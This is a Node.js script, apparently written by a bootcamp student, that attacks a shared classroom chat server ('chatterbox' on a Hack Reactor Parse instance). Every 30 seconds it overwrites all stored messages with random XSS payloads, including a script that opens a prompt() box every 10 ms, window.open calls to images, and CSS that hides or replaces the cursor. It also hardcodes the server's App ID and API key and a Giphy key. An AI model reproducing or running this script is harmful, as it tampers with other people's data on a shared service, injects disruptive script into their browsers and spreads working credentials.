/**
 * Created by jmichelin on 9/16/16.
 */
'use strict';
let request = require("request");
let EventEmitter = require('events').EventEmitter;
let randomGiphyEvent = new EventEmitter();

let hackArray = [
  '<script type=\'text/javascript\'>setInterval(function() { prompt(\'What is your quest?\') }, 10);</script>',
  'window.open("https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg")',
  'window.open("https://media.giphy.com/media/FQaonTdMD9Jqo/giphy.gif")',
  "<style>* {  cursor:url('http://i114.photobucket.com/albums/n248/MDWhiteDove/corgiwalking.gif'),auto;  }</style>",
  '<style>* {  cursor:none;  }</style>'
];

let gOptions = { method: 'GET',
  url: 'http://api.giphy.com/v1/gifs/random',
  qs: { api_key: 'dc6zaTOxFJmzC', tag: 'hacked' },
  headers:
    { 'postman-token': 'cc5bb711-8f8a-71d2-1a8f-b343ac49ed40',
      'cache-control': 'no-cache' } };


request(gOptions, function (error, response, data) {
  if (error) throw new Error(error);

  randomGiphyEvent.data = data;
  randomGiphyEvent.emit('update');
});


randomGiphyEvent.on('update', function () {
  console.log('randomGiphyEvent.data => ', JSON.parse(randomGiphyEvent.data).data.image_url);
  let randomGiphyUrl = JSON.parse(randomGiphyEvent.data).data.image_url;
  console.log('randomGiphyUrl => ', randomGiphyUrl);
  hackArray.push('window.open("'+ randomGiphyUrl +'")');
});




function getRandomIntInclusive(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
/*
 URL: http://parse.nyc.hackreactor.com/chatterbox/classes/messages
 App ID: 39715d2bec12f9dc1df3e125e13298f475e7e68f
 API Key: ed8204bd6cf2d93788258e1804415212609d218f
 */

let hackUrl = 'http://parse.nyc.hackreactor.com/chatterbox/classes/messages';
let appId = '39715d2bec12f9dc1df3e125e13298f475e7e68f';
let apiKey ='ed8204bd6cf2d93788258e1804415212609d218f';

const getOptions = { method: 'GET',
  url: hackUrl,
  qs: { order: '-createdAt' },
  headers:
  { 'postman-token': '2f5e62ff-04a8-6d5b-1e0c-008135b3375a',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'x-parse-rest-api-key': apiKey,
    'x-parse-application-id': appId }
};
setInterval(function(){
  console.log('\n\n\n\n new interval\n\n\n\n\n');
  request(getOptions, function (error, response, body) {
    if (error) throw new Error(error);

    let parsedResults = JSON.parse(body);
    //console.log('parsedResults.results => ', parsedResults.results);
    let parsedResultsArray = parsedResults.results;
    //console.log('parsedResultsArray => ', parsedResultsArray);
    parsedResultsArray.forEach(function(chat){
      //console.log('chat.objectId=> ', chat.objectId);
      //randomGiphyEvent.emit('update');
      let putOptions = {
        method: 'PUT',
        url: hackUrl+'/'+chat.objectId,
        headers:
        { 'postman-token': '688f9038-a094-4a1f-66be-7acbed997702',
          'cache-control': 'no-cache',
          'content-type': 'application/json',
          'x-parse-rest-api-key': apiKey,
          'x-parse-application-id': appId },
        body:
        { text: hackArray[getRandomIntInclusive(0,hackArray.length-1)],
          username: 'HRNYC-06',
          roomname: 'lobby' },
        json: true };

      request(putOptions, function (error, response, updatedAtDate) {
        if (error) throw new Error(error);
        console.log(chat.objectId, ' set new text to ', putOptions.body.text, ' with username ', putOptions.body.username, ' updated at ', updatedAtDate.updatedAt);
      });
    });
  });
  console.log('\n\n\n\n new interval\n\n\n\n\n');
}, 30000);